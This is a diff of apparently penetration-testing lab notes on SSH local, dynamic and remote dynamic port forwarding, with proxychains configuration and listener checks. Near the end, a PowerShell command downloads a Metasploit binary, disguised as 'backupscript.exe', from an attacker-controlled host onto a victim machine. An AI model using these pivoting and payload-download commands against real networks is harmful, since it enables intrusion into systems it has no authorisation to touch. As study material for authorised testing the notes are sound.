@@ -35,7 +35,7 @@ jumphost@ubuntu ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.
 
 Opens a listener on port 4455 (CONFULENCE01 Jump Host) and forwards all traffic through 10.4.50.215 to 172.16.50.217:445. (PGDATABASE01).
 
-_<mark style="color:red;">**NOTE**</mark>_: **-N** flag is means execute no remote commands. When we use this, we will not get any response back.
+_<mark style="color:red;">**NOTE**</mark>_: **-N** flag is means execute no remote commands. No shell will be opened.
 
 ## Dynamic Port Forwarding - Tunneling over SOCKS proxy
 
@@ -120,14 +120,54 @@ tcp              LISTEN            0                 128                        
 tcp              LISTEN            0                 128                                   [::]:22                                    [::]:*      
 ```
 
+## Remote Dynamic Port Forwarding
+
+_<mark style="color:red;">**NOTE:**</mark>_ This tends to be the most optimal setup for port forwarding during engagements. We get all the benefits from Dynamic Port forwarding along with the remote configurations.&#x20;
+
+### Create Dynamic Remote Port Forward
+
+Creating a Dynamic Remote Port Forward is similar to creating a Remote port forward. We use the -R command but only with one port. We do not specify and address! Neither do we use -D!
+
+```shell-session
+jumphost@ubuntu$ ssh -N -R 9998 kali@192.168.118.4
+```
+
+### Update SOCKS Proxy - proxychains
+
+```bash
+kali@kali:~$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998 # IP address is localhost 127.0.0.1
+```
+
+### Verifying Port Forward
+
+As we can see, our kali box is listening on 127.0.0.1 9998
+
+```shell-session
+kali@kali$ ss -ntlpu                     
+Netid            State             Recv-Q            Send-Q                       Local Address:Port                          Peer Address:Port            Process            
+udp              UNCONN            0                 0                                  0.0.0.0:52704                              0.0.0.0:*                                  
+tcp              LISTEN            0                 128                              127.0.0.1:9998                               0.0.0.0:*                                  
+tcp              LISTEN            0                 128                                0.0.0.0:22                                 0.0.0.0:*                                  
+tcp              LISTEN            0                 128                                   [::]:22
+```
+
+
+
+## Additional Info
+
 ### Transferring Metasploit Binary to Victim (on internal network).
 
-We may need to transfer a binary to a machine we have access to.
+We may need to transfer a binary to a machine we've gained access to so we can port forward.
 
 ```powershell
 PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
-
-## Remote Dynamic Port Forwarding
-
-Dynamic Remote Port Forwarding
